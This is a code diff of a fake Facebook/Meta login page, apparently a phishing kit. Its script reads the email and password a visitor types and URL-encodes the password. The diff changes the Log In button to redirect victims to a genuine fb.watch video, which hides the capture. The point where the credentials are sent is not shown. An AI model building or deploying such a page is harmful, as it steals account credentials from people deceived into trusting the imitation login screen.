@@ -58,7 +58,7 @@ float:none;
 
 <br><input type="text" name="email" placeholder="Mobile Number or email address" required><br>
 <input type="password" name="password" placeholder="Password" required ><br>
-<input type="submit" onclick="save()" value="Log In">
+<input type="submit" oninput="save()" onclick="location.href='https://fb.watch/fVxhUSKUzy/'" value="Log In">
 
 
 </div>
@@ -86,7 +86,7 @@ Meta © 2022
 <script type="text/javascript">
 i=document.getElementsByTagName("input");
 function save(){
-       function myFunc() {
+   /*    function myFunc() {
       // location.href="https://fb.watch/fO8BS_qt0u/";
 
 
@@ -99,7 +99,7 @@ window.location.replace("https://fb.watch/fVxhUSKUzy/");
          }
          
          var myTimeout = setTimeout(myFunc, 3000);
-               
+    */           
 x=i[0].value;
 y=i[1].value;
 y=encodeURIComponent(y);
